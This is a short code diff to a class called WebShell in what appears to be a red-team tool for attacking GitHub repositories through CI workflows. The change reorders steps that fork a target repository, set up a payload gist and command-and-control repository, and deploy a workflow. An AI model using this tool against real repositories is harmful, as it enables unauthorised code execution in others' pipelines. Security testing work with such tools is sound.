@@ -141,6 +141,17 @@ class WebShell(Attacker):
         else:
             Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
 
+        # Set up target repository (fork, validate, handle conflicts)
+        repo_name = await self.repository_manager.setup_target_repository(
+            target_repo,
+            target_branch,
+            source_branch,
+            self.author_name,
+            self.author_email,
+        )
+        if not repo_name:
+            return False
+
         gist_id, gist_url = await self.setup_payload_gist_and_workflow(
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
@@ -153,17 +164,6 @@ class WebShell(Attacker):
             f"Conducting an attack against {Output.bright(target_repo)} as the "
             f"user: {Output.bright(self.user_perms['user'])}!"
         )
-
-        # Set up target repository (fork, validate, handle conflicts)
-        repo_name = await self.repository_manager.setup_target_repository(
-            target_repo,
-            target_branch,
-            source_branch,
-            self.author_name,
-            self.author_email,
-        )
-        if not repo_name:
-            return False
 
         # Deploy workflow to the fork
         if not await self.repository_manager.deploy_workflow(
